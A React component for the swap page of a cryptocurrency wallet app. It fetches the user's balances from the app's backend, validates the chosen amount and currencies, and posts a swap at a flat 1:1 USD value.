// pages/Swap.jsx
import React, { useState, useEffect } from "react";
import { Link, useNavigate } from "react-router-dom";
import {
  ArrowsRightLeftIcon,
  ArrowDownIcon,
  ArrowUpIcon,
  CheckCircleIcon,
  XCircleIcon,
  InformationCircleIcon,
  ArrowLeftIcon,
} from "@heroicons/react/24/outline";

const Swap = () => {
  const navigate = useNavigate();

  // Available cryptocurrencies
  const cryptoOptions = [
    { id: "bitcoin", name: "Bitcoin", symbol: "BTC", icon: "₿" },
    { id: "ethereum", name: "Ethereum", symbol: "ETH", icon: "Ξ" },
    { id: "tether", name: "Tether", symbol: "USDT", icon: "₮" },
    { id: "binance-coin", name: "Binance Coin", symbol: "BNB", icon: "ⓑ" },
    { id: "solana", name: "Solana", symbol: "SOL", icon: "◎" },
    { id: "dogecoin", name: "Dogecoin", symbol: "DOGE", icon: "Ð" },
    { id: "ripple", name: "Ripple", symbol: "XRP", icon: "✕" },
    { id: "stellar", name: "Stellar", symbol: "XLM", icon: "✤" },
    { id: "tron", name: "Tron", symbol: "TRX", icon: "Ⓣ" },
  ];

  // State
  const [swapData, setSwapData] = useState({
    fromCrypto: "tether",
    toCrypto: "bitcoin",
    amount: "",
  });
  const [userBalances, setUserBalances] = useState({});
  const [loading, setLoading] = useState(true);
  const [swapping, setSwapping] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  // Fetch user balances
  useEffect(() => {
    fetchUserBalances();
  }, []);

  const fetchUserBalances = async () => {
    try {
      setLoading(true);
      const token = localStorage.getItem("token");

      if (!token) {
        navigate("/login");
        return;
      }

      const response = await fetch(
        "https://qfs-backend-ghuv.onrender.com/api/auth/me",
        {
          method: "GET",
          headers: {
            Authorization: `Bearer ${token}`,
            "Content-Type": "application/json",
          },
        }
      );

      const data = await response.json();

      if (response.ok && data.success) {
        const balances = data.data.user.wallet.balances || {};
        setUserBalances(balances);
        setError("");

        // Auto-select first crypto with balance
        const firstWithBalance = cryptoOptions.find(
          (crypto) => balances[crypto.id] > 0
        );
        if (firstWithBalance && swapData.fromCrypto === "tether") {
          setSwapData((prev) => ({
            ...prev,
            fromCrypto: firstWithBalance.id,
          }));
        }
      } else {
        setError(data.message || "Failed to fetch balances");
      }
    } catch (error) {
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const formatCurrency = (amount) => {
    return new Intl.NumberFormat("en-US", {
      style: "currency",
      currency: "USD",
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(amount || 0);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    if (name === "amount") {
      if (value === "" || /^\d*\.?\d*$/.test(value)) {
        setSwapData({
          ...swapData,
          [name]: value,
        });
        setError("");
      }
    } else {
      setSwapData({
        ...swapData,
        [name]: value,
      });
      setError("");
    }
  };

  const switchCurrencies = () => {
    setSwapData({
      fromCrypto: swapData.toCrypto,
      toCrypto: swapData.fromCrypto,
      amount: swapData.amount,
    });
  };

  const getCryptoBalance = (cryptoId) => {
    return userBalances[cryptoId] || 0;
  };

  const handleMaxAmount = () => {
    const balance = getCryptoBalance(swapData.fromCrypto);
    setSwapData({
      ...swapData,
      amount: balance.toString(),
    });
  };

  const handleSwap = async (e) => {
    e.preventDefault();

    const amount = parseFloat(swapData.amount);

    if (!swapData.amount || amount <= 0) {
      setError("Please enter a valid amount");
      return;
    }

    const balance = getCryptoBalance(swapData.fromCrypto);
    if (amount > balance) {
      setError(`Insufficient balance. You have ${formatCurrency(balance)}`);
      return;
    }

    if (swapData.fromCrypto === swapData.toCrypto) {
      setError("Cannot swap to the same cryptocurrency");
      return;
    }

    setLoading(true);
    setError("");

    try {
      const token = localStorage.getItem("token");
      const response = await fetch(
        "https://qfs-backend-ghuv.onrender.com/api/swap/execute",
        {
          method: "POST",
          headers: {
            Authorization: `Bearer ${token}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            fromCrypto: swapData.fromCrypto,
            toCrypto: swapData.toCrypto,
            amount: amount,
          }),
        }
      );

      const data = await response.json();

      if (response.ok && data.success) {
        setSwapping(true);

        setTimeout(() => {
          setSwapping(false);
          setSuccess(true);

          // Update local balances
          const newBalances = { ...userBalances };
          newBalances[swapData.fromCrypto] =
            (newBalances[swapData.fromCrypto] || 0) - amount;
          newBalances[swapData.toCrypto] =
            (newBalances[swapData.toCrypto] || 0) + amount;
          setUserBalances(newBalances);

          // Reset after success
          setTimeout(() => {
            setSuccess(false);
            setSwapData({
              fromCrypto: swapData.fromCrypto,
              toCrypto: swapData.toCrypto,
              amount: "",
            });
          }, 2000);
        }, 1500);
      } else {
        setError(data.message || "Swap failed. Please try again.");
      }
    } catch (error) {
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const getCryptoName = (cryptoId) => {
    const crypto = cryptoOptions.find((c) => c.id === cryptoId);
    return crypto ? crypto.name : cryptoId;
  };

  const getCryptoIcon = (cryptoId) => {
    const crypto = cryptoOptions.find((c) => c.id === cryptoId);
    return crypto ? crypto.icon : "◇";
  };

  if (loading && Object.keys(userBalances).length === 0) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <div className="relative h-16 w-16">
            <div className="absolute h-full w-full rounded-full border-4 border-blue-200"></div>
            <div className="absolute h-full w-full rounded-full border-4 border-transparent border-t-blue-600 animate-spin"></div>
            <div
              className="absolute h-full w-full rounded-full border-4 border-transparent border-b-purple-600 animate-spin"
              style={{ animationDuration: "1.5s" }}
            ></div>
            <div className="absolute h-8 w-8 rounded-full bg-linear-to-br from-blue-100 to-purple-100 top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"></div>
          </div>
          <p className="text-gray-600 mt-4 animate-pulse">Loading ...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-lg mx-auto">
      {/* Header */}
      <div className="flex items-center mb-8">
        <Link to="/dashboard" className="mr-4">
          <div className="h-10 w-10 rounded-full bg-emerald-100 flex items-center justify-center hover:bg-emerald-200 transition-colors">
            <ArrowLeftIcon className="h-5 w-5 text-emerald-700" />
          </div>
        </Link>
      </div>

      {/* Swap Card */}
      <div className="bg-gradient-to-br from-emerald-900 to-green-900 rounded-2xl border border-emerald-800 shadow-xl overflow-hidden mb-8">
        {/* Card Header */}
        <div className="px-6 pt-6 pb-4 border-b border-emerald-800">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-xl font-bold text-white">Instant Swap</h2>
              <p className="text-emerald-300 text-sm mt-1">
                Trade between supported cryptocurrencies
              </p>
            </div>
            <div className="h-10 w-10 rounded-full bg-emerald-800 flex items-center justify-center">
              <ArrowsRightLeftIcon className="h-5 w-5 text-emerald-300" />
            </div>
          </div>
        </div>

        {/* Swap Form */}
        <div className="p-6">
          {success ? (
            <div className="text-center py-8">
              <div className="h-16 w-16 rounded-full bg-emerald-700 flex items-center justify-center mx-auto mb-4">
                <CheckCircleIcon className="h-8 w-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-white mb-2">
                Swap Successful!
              </h3>
              <p className="text-emerald-300 mb-6">
                {formatCurrency(parseFloat(swapData.amount))} of{" "}
                {getCryptoName(swapData.fromCrypto)} →{" "}
                {getCryptoName(swapData.toCrypto)}
              </p>
              <Link
                to="/dashboard"
                className="inline-block px-6 py-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-500 transition-colors"
              >
                Back to Dashboard
              </Link>
            </div>
          ) : swapping ? (
            <div className="text-center py-8">
              <div className="h-16 w-16 rounded-full border-4 border-emerald-500 border-t-transparent animate-spin mx-auto mb-4"></div>
              <h3 className="text-xl font-bold text-white mb-2">
                Processing Swap
              </h3>
              <p className="text-emerald-300">
                Please wait while we process your transaction...
              </p>
            </div>
          ) : (
            <form onSubmit={handleSwap}>
              {/* From Section */}
              <div className="bg-emerald-950/50 rounded-xl p-4 border border-emerald-800 mb-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm text-emerald-300 font-medium">
                    From
                  </span>
                  <div className="text-xs text-emerald-400">
                    Available:{" "}
                    <span className="font-medium">
                      {formatCurrency(getCryptoBalance(swapData.fromCrypto))}
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <div className="flex-1">
                    <input
                      type="text"
                      name="amount"
                      value={swapData.amount}
                      onChange={handleInputChange}
                      placeholder="0.00"
                      className="w-full bg-transparent text-2xl font-bold text-white placeholder-emerald-400 outline-none"
                    />
                    <div className="text-xs text-emerald-500 mt-1">
                      {swapData.amount &&
                        `≈ ${formatCurrency(parseFloat(swapData.amount))}`}
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={handleMaxAmount}
                      className="px-3 py-1 text-xs bg-emerald-800 text-emerald-300 rounded-lg hover:bg-emerald-700 transition-colors whitespace-nowrap"
                    >
                      MAX
                    </button>

                    <div className="relative min-w-[100px]">
                      <select
                        name="fromCrypto"
                        value={swapData.fromCrypto}
                        onChange={handleInputChange}
                        className="w-full appearance-none bg-emerald-900 border border-emerald-700 rounded-lg pl-3 pr-8 py-2 text-white text-sm font-medium focus:outline-none focus:border-emerald-500 cursor-pointer"
                      >
                        {cryptoOptions.map((crypto) => (
                          <option
                            key={crypto.id}
                            value={crypto.id}
                            disabled={getCryptoBalance(crypto.id) <= 0}
                          >
                            {crypto.symbol}
                          </option>
                        ))}
                      </select>
                      <ArrowDownIcon className="h-3 w-3 text-emerald-400 absolute right-3 top-3.5 pointer-events-none" />
                    </div>
                  </div>
                </div>

                <div className="flex items-center mt-3 pt-3 border-t border-emerald-800/50">
                  <div className="h-7 w-7 rounded-full bg-emerald-800 flex items-center justify-center mr-2">
                    <span className="text-emerald-300 text-sm font-bold">
                      {getCryptoIcon(swapData.fromCrypto)}
                    </span>
                  </div>
                  <span className="text-sm text-emerald-300">
                    {getCryptoName(swapData.fromCrypto)}
                  </span>
                </div>
              </div>

              {/* Switch Button */}
              <div className="relative my-2">
                <div className="absolute inset-0 flex items-center justify-center">
                  <button
                    type="button"
                    onClick={switchCurrencies}
                    className="h-8 w-8 rounded-full bg-emerald-800 border-4 border-emerald-900 flex items-center justify-center hover:bg-emerald-700 transition-colors z-10"
                  >
                    <ArrowUpIcon className="h-3 w-3 text-emerald-300" />
                    <ArrowDownIcon className="h-3 w-3 text-emerald-300 -mt-0.5" />
                  </button>
                </div>
              </div>

              {/* To Section */}
              <div className="bg-emerald-950/50 rounded-xl p-4 border border-emerald-800">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm text-emerald-300 font-medium">
                    To (Estimate)
                  </span>
                  <div className="text-xs text-emerald-400">
                    Balance:{" "}
                    <span className="font-medium">
                      {formatCurrency(getCryptoBalance(swapData.toCrypto))}
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <div className="flex-1">
                    <div className="text-2xl font-bold text-white">
                      {swapData.amount
                        ? formatCurrency(parseFloat(swapData.amount))
                        : "$0.00"}
                    </div>
                    <div className="text-xs text-emerald-500 mt-1">
                      Same USD value as input
                    </div>
                  </div>

                  <div className="relative min-w-[100px]">
                    <select
                      name="toCrypto"
                      value={swapData.toCrypto}
                      onChange={handleInputChange}
                      className="w-full appearance-none bg-emerald-900 border border-emerald-700 rounded-lg pl-3 pr-8 py-2 text-white text-sm font-medium focus:outline-none focus:border-emerald-500 cursor-pointer"
                    >
                      {cryptoOptions.map((crypto) => (
                        <option key={crypto.id} value={crypto.id}>
                          {crypto.symbol}
                        </option>
                      ))}
                    </select>
                    <ArrowDownIcon className="h-3 w-3 text-emerald-400 absolute right-3 top-3.5 pointer-events-none" />
                  </div>
                </div>

                <div className="flex items-center mt-3 pt-3 border-t border-emerald-800/50">
                  <div className="h-7 w-7 rounded-full bg-emerald-800 flex items-center justify-center mr-2">
                    <span className="text-emerald-300 text-sm font-bold">
                      {getCryptoIcon(swapData.toCrypto)}
                    </span>
                  </div>
                  <span className="text-sm text-emerald-300">
                    {getCryptoName(swapData.toCrypto)}
                  </span>
                </div>
              </div>

              {/* Swap Info */}
              <div className="mt-4 p-3 bg-emerald-950/30 rounded-lg border border-emerald-800/50 text-sm">
                <div className="flex justify-between">
                  <span className="text-emerald-400">Exchange Rate</span>
                  <span className="text-emerald-300 font-medium">
                    1:1 USD Value
                  </span>
                </div>
                <div className="flex justify-between mt-1">
                  <span className="text-emerald-400">Network Fee</span>
                  <span className="text-emerald-300 font-medium">No Fees</span>
                </div>
              </div>

              {/* Error Message */}
              {error && (
                <div className="mt-4 p-3 bg-red-900/20 border border-red-800 rounded-lg">
                  <div className="flex items-center">
                    <XCircleIcon className="h-4 w-4 text-red-400 mr-2 flex-shrink-0" />
                    <span className="text-red-300 text-sm">{error}</span>
                  </div>
                </div>
              )}

              {/* Swap Button */}
              <button
                type="submit"
                disabled={
                  !swapData.amount ||
                  parseFloat(swapData.amount) <= 0 ||
                  loading
                }
                className={`w-full mt-6 py-3 rounded-xl font-bold text-white transition-all ${
                  !swapData.amount ||
                  parseFloat(swapData.amount) <= 0 ||
                  loading
                    ? "bg-emerald-800/50 text-emerald-400 cursor-not-allowed"
                    : "bg-emerald-600 hover:bg-emerald-500 shadow-lg"
                }`}
              >
                {loading ? "Processing..." : "Swap Now"}
              </button>

              {/* Disclaimer */}
              <div className="mt-4 flex items-start text-xs text-emerald-400 ">
                <InformationCircleIcon className="h-4 w-4 mr-2 mt-0.5 flex-shrink-0" />
                <p>
                  Swap executes instantly at equal USD value. Your balances will
                  update immediately.
                </p>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  );
};

export default Swap;
